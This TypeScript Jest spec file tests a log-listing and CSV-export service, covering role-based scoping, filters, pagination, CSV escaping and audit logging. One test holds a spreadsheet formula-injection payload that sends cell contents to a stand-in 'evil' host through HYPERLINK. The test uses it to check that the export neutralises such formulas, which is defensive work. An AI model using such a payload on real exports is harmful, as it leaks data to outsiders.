// Screen: ACSMS-SCR-030 — ログ参照画面
//
// LogService unit specs for:
//   - getLogList(query, session)        — ACSMS-API-030-001
//   - exportLogCsv(query, session, req) — ACSMS-API-030-002 (CSV + audit log)
//
// Pattern: plain `new LogService(...)` with mocked deps.

import { LogService } from '@/modules/log/log.service';
import {
  buildSession,
  buildChuokaiSession,
  buildJaHontenSession,
  buildJaKanriShitenSession,
} from '@test/fixtures/session.factory';
import { buildSearchLogQuery, buildExportLogQuery } from '@test/fixtures/log.factory';

describe('LogService', () => {
  let service: LogService;
  let logRepo: any;
  let auditLog: any;
  let dataSource: any;
  let codeService: any;
  let qbMock: any;
  let countQbMock: any;

  const req = {
    ip: '192.168.1.50',
    headers: { 'user-agent': 'jest' },
  } as any;

  beforeEach(() => {
    qbMock = {
      where: jest.fn().mockReturnThis(),
      andWhere: jest.fn().mockReturnThis(),
      leftJoin: jest.fn().mockReturnThis(),
      leftJoinAndSelect: jest.fn().mockReturnThis(),
      select: jest.fn().mockReturnThis(),
      addSelect: jest.fn().mockReturnThis(),
      orderBy: jest.fn().mockReturnThis(),
      take: jest.fn().mockReturnThis(),
      skip: jest.fn().mockReturnThis(),
      limit: jest.fn().mockReturnThis(),
      offset: jest.fn().mockReturnThis(),
      getOne: jest.fn(),
      getRawOne: jest.fn(),
      getMany: jest.fn().mockResolvedValue([]),
      getRawMany: jest.fn().mockResolvedValue([]),
      getManyAndCount: jest.fn().mockResolvedValue([[], 0]),
      getCount: jest.fn().mockResolvedValue(0),
    };

    countQbMock = {
      where: jest.fn().mockReturnThis(),
      andWhere: jest.fn().mockReturnThis(),
      leftJoin: jest.fn().mockReturnThis(),
      leftJoinAndSelect: jest.fn().mockReturnThis(),
      select: jest.fn().mockReturnThis(),
      addSelect: jest.fn().mockReturnThis(),
      orderBy: jest.fn().mockReturnThis(),
      addOrderBy: jest.fn().mockReturnThis(),
      take: jest.fn().mockReturnThis(),
      skip: jest.fn().mockReturnThis(),
      limit: jest.fn().mockReturnThis(),
      offset: jest.fn().mockReturnThis(),
      getCount: jest.fn().mockResolvedValue(0),
      getOne: jest.fn(),
      getRawOne: jest.fn(),
      getMany: jest.fn().mockResolvedValue([]),
      getRawMany: jest.fn().mockResolvedValue([]),
      getManyAndCount: jest.fn().mockResolvedValue([[], 0]),
    };

    // qbMock returned on 1st createQueryBuilder call, countQbMock on 2nd.
    // NOTE on naming: getLogList calls QB-for-data FIRST and QB-for-count
    // SECOND, matching the variable names below. exportLogCsv has the
    // INVERSE order (count first, data second) — so its tests must wire
    // expectations on the *opposite* mock from intuition: getCount goes
    // on qbMock, getRawMany goes on countQbMock. Keep the names as-is
    // (renaming would ripple through dozens of getLogList assertions);
    // exportLogCsv tests document this swap inline.
    let qbCalls = 0;
    logRepo = {
      createQueryBuilder: jest.fn(() => (qbCalls++ === 0 ? qbMock : countQbMock)),
    };

    auditLog = {
      logOperation: jest.fn().mockResolvedValue(undefined),
      logError: jest.fn().mockResolvedValue(undefined),
    };

    dataSource = {
      transaction: jest.fn(async (cb: any) => cb({ getRepository: () => ({}) })),
    };

    // CodeService stub returns m_code labels for LOG_TYPE / RESULT_STATUS,
    // matching the seeded values. Used only by CSV export now (list
    // response no longer carries `*_label` per the project rule).
    codeService = {
      getLabel: jest.fn((category: string, value: number | string) => {
        const maps: Record<string, Record<number, string>> = {
          LOG_TYPE: {
            1: 'ユーザー操作',
            2: 'システム',
            3: 'エラー',
            4: 'ファイルアップロード',
          },
          RESULT_STATUS: { 1: '成功', 2: '失敗', 3: '警告' },
        };
        return maps[category]?.[Number(value)] ?? '';
      }),
    };

    service = new LogService(logRepo, auditLog, dataSource, codeService);
  });

  afterEach(() => jest.restoreAllMocks());

  // ═══════════════════════════════════════════════════════════════════
  // ACSMS-API-030-001 — GET /api/v1/log
  // ═══════════════════════════════════════════════════════════════════
  describe('getLogList', () => {
    it('should return paginated response with data + meta keys when session is NICHINO_ADMIN', async () => {
      qbMock.getRawMany.mockResolvedValue([
        {
          log_id: 10500,
          log_type: 1,
          log_datetime: new Date('2026-04-17T05:30:45Z'),
          account_id: 10,
          login_id: 'ja_honten_001',
          account_name: 'JA本店 太郎',
          ja_id: 100,
          gamen_name: '単価マスタ登録画面 (ACSMS-SCR-003)',
          operation: 'CREATE',
          result_status: 1,
          target_id: 50,
          target_table: 'm_tanka',
          after_value: '{"tanka_id":50}',
          ip_address: '192.168.1.100',
        },
      ]);
      countQbMock.getCount.mockResolvedValue(1);

      const result = await service.getLogList(buildSearchLogQuery(), buildSession());

      expect(result).toEqual(
        expect.objectContaining({
          data: expect.any(Array),
          meta: expect.objectContaining({
            total: 1,
            page: 1,
            per_page: 20,
            total_pages: 1,
          }),
        }),
      );
      expect(result.data[0]).toEqual(
        expect.objectContaining({
          log_id: 10500,
          log_type: 1,
          result_status: 1,
          account_id: 10,
          login_id: 'ja_honten_001',
        }),
      );
      // [no-labels-policy] Authenticated list response no longer emits
      // log_type_label / result_status_label — FE resolves via codes store.
      expect(result.data[0]).not.toHaveProperty('log_type_label');
      expect(result.data[0]).not.toHaveProperty('result_status_label');
    });

    it('should return every log_type / result_status code as a raw number (labels resolved client-side)', async () => {
      // [no-labels-policy] Authenticated list endpoint does NOT include
      // `log_type_label` / `result_status_label` per the project rule;
      // FE resolves them via useCodesStore().label(...). The CSV export
      // path is tested separately under the CSV describe block.
      qbMock.getRawMany.mockResolvedValue([
        { log_id: 1, log_type: 1, result_status: 1, log_datetime: new Date(), gamen_name: '', operation: '', target_table: '', after_value: '', ip_address: '', account_id: null, login_id: null, account_name: null, ja_id: null, target_id: null },
        { log_id: 2, log_type: 2, result_status: 1, log_datetime: new Date(), gamen_name: '', operation: '', target_table: '', after_value: '', ip_address: '', account_id: null, login_id: null, account_name: null, ja_id: null, target_id: null },
        { log_id: 3, log_type: 3, result_status: 2, log_datetime: new Date(), gamen_name: '', operation: '', target_table: '', after_value: '', ip_address: '', account_id: null, login_id: null, account_name: null, ja_id: null, target_id: null },
        { log_id: 4, log_type: 4, result_status: 3, log_datetime: new Date(), gamen_name: '', operation: '', target_table: '', after_value: '', ip_address: '', account_id: null, login_id: null, account_name: null, ja_id: null, target_id: null },
      ]);
      countQbMock.getCount.mockResolvedValue(4);

      const result = await service.getLogList(buildSearchLogQuery(), buildSession());

      expect(result.data.map((r: any) => r.log_type)).toEqual([1, 2, 3, 4]);
      expect(result.data.map((r: any) => r.result_status)).toEqual([1, 1, 2, 3]);
      // Confirm the `*_label` fields are absent from the wire shape.
      expect(result.data[0]).not.toHaveProperty('log_type_label');
      expect(result.data[0]).not.toHaveProperty('result_status_label');
    });

    it('should format log_datetime as YYYY/MM/DD HH:mm:ss in JST when service returns a Date', async () => {
      // 2026-04-17T05:30:45Z = 2026/04/17 14:30:45 JST (+09:00).
      qbMock.getRawMany.mockResolvedValue([
        {
          log_id: 1,
          log_type: 1,
          result_status: 1,
          log_datetime: new Date('2026-04-17T05:30:45Z'),
          gamen_name: '',
          operation: '',
          target_table: '',
          after_value: '',
          ip_address: '',
          account_id: null,
          login_id: null,
          account_name: null,
          ja_id: null,
          target_id: null,
        },
      ]);
      countQbMock.getCount.mockResolvedValue(1);

      const result = await service.getLogList(buildSearchLogQuery(), buildSession());

      expect(result.data[0].log_datetime).toBe('2026/04/17 14:30:45');
    });

    it('should apply NO DataScope predicate when session role_code is NICHINO_ADMIN (bypass)', async () => {
      qbMock.getRawMany.mockResolvedValue([]);
      countQbMock.getCount.mockResolvedValue(0);

      await service.getLogList(buildSearchLogQuery(), buildSession());

      const calls = qbMock.andWhere.mock.calls;
      const scopedCall = calls.find(
        ([_sql, params]: any[]) =>
          params &&
          (Object.prototype.hasOwnProperty.call(params, 'scopeJaId') ||
            Object.prototype.hasOwnProperty.call(params, 'scopeKanriShitenId')),
      );
      expect(scopedCall).toBeUndefined();
    });

    it('should apply NO DataScope predicate when session role_code is NICHINO_STAFF (bypass)', async () => {
      qbMock.getRawMany.mockResolvedValue([]);
      countQbMock.getCount.mockResolvedValue(0);

      await service.getLogList(
        buildSearchLogQuery(),
        buildSession({ role_code: 'NICHINO_STAFF', role_id: 2 }),
      );

      const calls = qbMock.andWhere.mock.calls;
      const scopedCall = calls.find(
        ([_sql, params]: any[]) =>
          params &&
          (Object.prototype.hasOwnProperty.call(params, 'scopeJaId') ||
            Object.prototype.hasOwnProperty.call(params, 'scopeKanriShitenId')),
      );
      expect(scopedCall).toBeUndefined();
    });

    it('should bind l.ja_id scope predicate when session role_code is CHUOKAI', async () => {
      qbMock.getRawMany.mockResolvedValue([]);
      countQbMock.getCount.mockResolvedValue(0);

      await service.getLogList(buildSearchLogQuery(), buildChuokaiSession({ ja_id: 7 }));

      const scopedCall = qbMock.andWhere.mock.calls.find(
        ([sql]: any[]) => typeof sql === 'string' && /\bja_?[Ii]d\b/.test(sql),
      );
      expect(scopedCall).toBeDefined();
    });

    it('should bind l.ja_id scope predicate when session role_code is JA_HONTEN', async () => {
      qbMock.getRawMany.mockResolvedValue([]);
      countQbMock.getCount.mockResolvedValue(0);

      await service.getLogList(buildSearchLogQuery(), buildJaHontenSession({ ja_id: 9 }));

      const scopedCall = qbMock.andWhere.mock.calls.find(
        ([sql]: any[]) => typeof sql === 'string' && /\bja_?[Ii]d\b/.test(sql),
      );
      expect(scopedCall).toBeDefined();
    });

    it('should bind a.kanri_shiten_id scope predicate when session role_code is JA_KANRI_SHITEN', async () => {
      qbMock.getRawMany.mockResolvedValue([]);
      countQbMock.getCount.mockResolvedValue(0);

      await service.getLogList(
        buildSearchLogQuery(),
        buildJaKanriShitenSession({ kanri_shiten_id: 33 }),
      );

      const scopedCall = qbMock.andWhere.mock.calls.find(
        ([sql]: any[]) => typeof sql === 'string' && /\bkanri_?[Ss]hiten_?[Ii]d\b/.test(sql),
      );
      expect(scopedCall).toBeDefined();
    });

    it('should bind date_from filter when query.date_from is provided', async () => {
      qbMock.getRawMany.mockResolvedValue([]);
      countQbMock.getCount.mockResolvedValue(0);

      await service.getLogList(
        buildSearchLogQuery({ date_from: '2026/04/01 00:00:00' }),
        buildSession(),
      );

      const filterCall = qbMock.andWhere.mock.calls.find(
        ([sql]: any[]) => typeof sql === 'string' && /log_datetime\s*>=/.test(sql),
      );
      expect(filterCall).toBeDefined();
    });

    it('should bind date_to filter when query.date_to is provided', async () => {
      qbMock.getRawMany.mockResolvedValue([]);
      countQbMock.getCount.mockResolvedValue(0);

      await service.getLogList(
        buildSearchLogQuery({ date_to: '2026/04/17 23:59:59' }),
        buildSession(),
      );

      const filterCall = qbMock.andWhere.mock.calls.find(
        ([sql]: any[]) => typeof sql === 'string' && /log_datetime\s*<=/.test(sql),
      );
      expect(filterCall).toBeDefined();
    });

    it('should bind log_type filter when query.log_type is provided', async () => {
      qbMock.getRawMany.mockResolvedValue([]);
      countQbMock.getCount.mockResolvedValue(0);

      await service.getLogList(
        buildSearchLogQuery({ log_type: 3 }),
        buildSession(),
      );

      const filterCall = qbMock.andWhere.mock.calls.find(
        ([_sql, params]: any[]) =>
          params && Object.prototype.hasOwnProperty.call(params, 'log_type'),
      );
      expect(filterCall).toBeDefined();
    });

    it('should bind account_id filter when query.account_id is provided', async () => {
      qbMock.getRawMany.mockResolvedValue([]);
      countQbMock.getCount.mockResolvedValue(0);

      await service.getLogList(
        buildSearchLogQuery({ account_id: 99 }),
        buildSession(),
      );

      const filterCall = qbMock.andWhere.mock.calls.find(
        ([_sql, params]: any[]) =>
          params && Object.prototype.hasOwnProperty.call(params, 'account_id'),
      );
      expect(filterCall).toBeDefined();
    });

    it('should apply pagination via limit + offset when page=2 per_page=10', async () => {
      qbMock.getRawMany.mockResolvedValue([]);
      countQbMock.getCount.mockResolvedValue(0);

      await service.getLogList(
        buildSearchLogQuery({ page: 2, per_page: 10 }),
        buildSession(),
      );

      // limit/offset (NOT take/skip) — take/skip are ignored by getRawMany().
      expect(qbMock.limit).toHaveBeenCalledWith(10);
      expect(qbMock.offset).toHaveBeenCalledWith(10);
    });

    it('should apply ORDER BY log_datetime DESC by default when sort params are omitted', async () => {
      qbMock.getRawMany.mockResolvedValue([]);
      countQbMock.getCount.mockResolvedValue(0);

      await service.getLogList({}, buildSession());

      const orderCall = qbMock.orderBy.mock.calls[0];
      expect(orderCall[0]).toMatch(/log_datetime/i);
      expect(orderCall[1]).toBe('DESC');
    });

    it('should return data:[] and meta.total=0 when repository returns no rows', async () => {
      qbMock.getRawMany.mockResolvedValue([]);
      countQbMock.getCount.mockResolvedValue(0);

      const result = await service.getLogList(buildSearchLogQuery(), buildSession());

      expect(result.data).toEqual([]);
      expect(result.meta.total).toBe(0);
      expect(result.meta.total_pages).toBe(0);
    });

  });

  // ═══════════════════════════════════════════════════════════════════
  // ACSMS-API-030-002 — GET /api/v1/log/export (CSV)
  // ═══════════════════════════════════════════════════════════════════
  describe('exportLogCsv', () => {
    it('should return a CSV buffer + filename when count is below the 5000 limit', async () => {
      qbMock.getCount.mockResolvedValue(250);
      countQbMock.getRawMany.mockResolvedValue([
        {
          log_id: 10500,
          log_type: 1,
          log_datetime: new Date('2026-04-17T05:30:45Z'),
          login_id: 'ja_honten_001',
          ja_id: 100,
          gamen_name: '単価マスタ登録画面 (ACSMS-SCR-003)',
          operation: 'CREATE',
          result_status: 1,
          target_id: 50,
          target_table: 'm_tanka',
          ip_address: '192.168.1.100',
        },
      ]);

      const result = await service.exportLogCsv(
        buildExportLogQuery(),
        buildSession(),
        req,
      );

      expect(result).toEqual(
        expect.objectContaining({
          buffer: expect.any(Buffer),
          filename: expect.stringMatching(/^log_export_\d{8}_\d{6}\.csv$/),
        }),
      );
    });

    it('should export ONLY the current screen page via limit/offset (not all data)', async () => {
      qbMock.getRawMany.mockResolvedValue([]);

      await service.exportLogCsv(
        buildExportLogQuery({ page: 3, per_page: 10 }),
        buildSession(),
        req,
      );

      // Same paging contract as the list — current page only, no row cap.
      expect(qbMock.limit).toHaveBeenCalledWith(10);
      expect(qbMock.offset).toHaveBeenCalledWith(20); // (3-1) * 10
    });

    it('should include the UTF-8 BOM at the start of the CSV buffer for Excel compatibility', async () => {
      qbMock.getCount.mockResolvedValue(0);
      countQbMock.getRawMany.mockResolvedValue([]);

      const result = await service.exportLogCsv(
        buildExportLogQuery(),
        buildSession(),
        req,
      );

      // UTF-8 BOM = EF BB BF
      const bom = Uint8Array.from([0xef, 0xbb, 0xbf]);
      expect(result.buffer.subarray(0, 3)).toEqual(Buffer.from(bom));
    });

    it('should neutralize CSV formula injection in attacker-influenced cells (ip_address)', async () => {
      // ip_address is sourced from the unvalidated X-Forwarded-For header and
      // stored in t_log. A cell beginning with = + - @ (or TAB/CR) must be
      // prefixed with a single quote so Excel/LibreOffice treat it as text,
      // not a formula (DDE / data-exfiltration payload).
      qbMock.getCount.mockResolvedValue(1);
      qbMock.getRawMany.mockResolvedValue([
        {
          log_id: 1,
          log_type: 1,
          log_datetime: new Date('2026-04-17T05:30:45Z'),
          login_id: 'attacker01',
          ja_id: 100,
          gamen_name: 'x',
          operation: 'CREATE',
          result_status: 1,
          target_id: 1,
          target_table: 'm_tanka',
          ip_address: '=HYPERLINK("http://evil/?"&A1,"click")',
        },
      ]);

      const result = await service.exportLogCsv(
        buildExportLogQuery(),
        buildSession(),
        req,
      );
      const text = result.buffer.toString('utf8');

      // The dangerous value appears prefixed with a single quote inside quotes,
      // and never as a bare formula leader `"=`.
      expect(text).toContain(`"'=HYPERLINK`);
      expect(text).not.toContain('"=HYPERLINK');
    });

    it('should include the canonical Japanese header row in the CSV when called', async () => {
      qbMock.getCount.mockResolvedValue(0);
      countQbMock.getRawMany.mockResolvedValue([]);

      const result = await service.exportLogCsv(
        buildExportLogQuery(),
        buildSession(),
        req,
      );

      const text = result.buffer.toString('utf8');
      // header columns per api.md §4.5
      expect(text).toContain('ログID');
      expect(text).toContain('ログ種別');
      expect(text).toContain('日時');
      expect(text).toContain('ユーザーID');
      expect(text).toContain('JA ID');
      expect(text).toContain('画面名');
      expect(text).toContain('操作内容');
      expect(text).toContain('結果');
      expect(text).toContain('対象ID');
      expect(text).toContain('対象テーブル');
      expect(text).toContain('IPアドレス');
    });

    it('should map log_type=1 → ユーザー操作 and result_status=2 → 失敗 in the CSV body', async () => {
      qbMock.getRawMany.mockResolvedValue([
        {
          log_id: 1,
          log_type: 1,
          log_datetime: new Date('2026-04-17T05:30:45Z'),
          login_id: 'admin01',
          ja_id: 100,
          gamen_name: 'X',
          operation: 'CREATE',
          result_status: 1,
          target_id: 1,
          target_table: 't',
          ip_address: '1.1.1.1',
        },
        {
          log_id: 2,
          log_type: 3,
          log_datetime: new Date('2026-04-17T05:35:00Z'),
          login_id: 'admin01',
          ja_id: 100,
          gamen_name: 'Y',
          operation: 'UPDATE',
          result_status: 2,
          target_id: null,
          target_table: 'u',
          ip_address: '1.1.1.1',
        },
      ]);

      const result = await service.exportLogCsv(
        buildExportLogQuery(),
        buildSession(),
        req,
      );

      const text = result.buffer.toString('utf8');
      expect(text).toContain('ユーザー操作');
      expect(text).toContain('エラー');
      expect(text).toContain('成功');
      expect(text).toContain('失敗');
    });

    it('should escape values containing commas/quotes/newlines by wrapping in double-quotes and doubling internal quotes', async () => {
      qbMock.getRawMany.mockResolvedValue([
        {
          log_id: 1,
          log_type: 1,
          log_datetime: new Date('2026-04-17T05:30:45Z'),
          login_id: 'admin01',
          ja_id: 100,
          gamen_name: 'A "tricky" name, with comma',
          operation: 'CREATE',
          result_status: 1,
          target_id: 1,
          target_table: 't',
          ip_address: '1.1.1.1',
        },
      ]);

      const result = await service.exportLogCsv(
        buildExportLogQuery(),
        buildSession(),
        req,
      );

      const text = result.buffer.toString('utf8');
      expect(text).toContain('"A ""tricky"" name, with comma"');
    });

    it('should write an audit log entry with bare CREATE operation when export succeeds (covers §4.6)', async () => {
      qbMock.getCount.mockResolvedValue(3);
      countQbMock.getRawMany.mockResolvedValue([]);

      await service.exportLogCsv(buildExportLogQuery(), buildSession(), req);

      // Per api.md §4.6 the operation column logs the EXPORT action.
      // Audit log lives in the service helper logOperation (since this
      // CSV path is not a standard CRUD verb). Assert it was called with
      // a USER_OPERATION log_type and SUCCESS result_status.
      expect(auditLog.logOperation).toHaveBeenCalled();
      const args = auditLog.logOperation.mock.calls[0][0];
      expect(args).toEqual(
        expect.objectContaining({
          logType: 1,
          resultStatus: 1,
          targetTable: 't_log',
        }),
      );
    });

    it('should record record_count (= exported page row count) in after_value JSON when export succeeds (covers §4.6)', async () => {
      qbMock.getRawMany.mockResolvedValue([
        {
          log_id: 1,
          log_type: 1,
          log_datetime: new Date('2026-04-17T05:30:45Z'),
          login_id: 'admin01',
          ja_id: 100,
          gamen_name: 'X',
          operation: 'CREATE',
          result_status: 1,
          target_id: 1,
          target_table: 't',
          ip_address: '1.1.1.1',
        },
        {
          log_id: 2,
          log_type: 2,
          log_datetime: new Date('2026-04-17T05:31:00Z'),
          login_id: 'admin01',
          ja_id: 100,
          gamen_name: 'Y',
          operation: 'UPDATE',
          result_status: 1,
          target_id: 2,
          target_table: 'u',
          ip_address: '1.1.1.1',
        },
      ]);

      await service.exportLogCsv(buildExportLogQuery(), buildSession(), req);

      const args = auditLog.logOperation.mock.calls[0][0];
      expect(args.afterValue).toContain('record_count');
      expect(args.afterValue).toContain('2');
    });

    it('should emit error log (log_type=3) OUTSIDE the transaction when export fails', async () => {
      // exportLogCsv now builds a SINGLE data QB (= qbMock) — no count query.
      qbMock.getRawMany.mockRejectedValueOnce(new Error('db-down'));

      await expect(
        service.exportLogCsv(buildExportLogQuery(), buildSession(), req),
      ).rejects.toBeDefined();

      // logError must be called (log_type=3, result_status=2 set by the helper).
      expect(auditLog.logError).toHaveBeenCalled();
    });
  });
});
